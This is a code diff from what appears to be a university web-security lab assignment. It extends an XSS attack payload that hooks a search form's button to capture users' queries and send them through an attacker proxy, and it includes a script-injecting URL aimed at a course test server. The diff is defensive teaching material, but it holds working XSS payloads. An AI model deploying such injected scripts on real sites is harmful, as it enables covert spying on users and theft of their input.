@@ -81,7 +81,17 @@ function payload(attacker) {
                 $('html').show();
 
                 // TODO implement spying while being stealthy and persistent. Remove the alert.
-                alert("Notice that although we injected code into the search page, you see here the main page!")
+                
+                // modify search form
+                document.getElementById('search-btn').addEventListener(
+                    'click', 
+                    function() {
+                        alert(document.getElementById("query").value); // TODO send attack info here
+                        proxy('./search?q=' + encodeURIComponent(document.getElementById("query").value), attacker);
+                    }
+                );
+
+                // TODO capture other buttons
 
             });
     	}
@@ -96,7 +106,7 @@ function makeLink(target, attacker, defense) {
 
     switch(defense) {
         case 1:
-            // TODO: Implement XSS warmup 2.2.3.1
+            // DONE: Implement XSS warmup 2.2.3.1
             return  "http://bungle.cs.virginia.edu/multivac/?name=%3Cscript%3Ewindow.onload=function(){document.getElementsByTagName(%22a%22)[0].href=%22http://ece.illinois.edu/%22;}%3C/script%3E"
         case 2:
             // TODO: generate XSS URL for defense level 2.2.3.2 (replace/extend this sample)
